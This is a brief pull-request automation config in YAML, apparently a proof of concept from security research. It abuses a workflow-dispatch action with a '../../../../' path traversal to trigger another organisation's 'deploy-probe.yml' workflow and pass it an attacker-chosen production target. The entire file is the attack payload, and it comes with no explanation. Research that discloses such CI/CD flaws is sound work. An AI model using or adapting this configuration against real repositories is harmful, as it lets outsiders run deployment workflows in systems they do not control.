pull_request_rules:
  - name: attacker-controls-inputs
    conditions:
      - base=main
      - label=pwn-inputs
    actions:
      github_actions:
        workflow:
          dispatch:
            - workflow: "../../../../kirasec-research1/ci-confidential-30019349/actions/workflows/deploy-probe.yml"
              ref: main
              inputs:
                target: "ATTACKER-CHOSE-production-us-east-1"
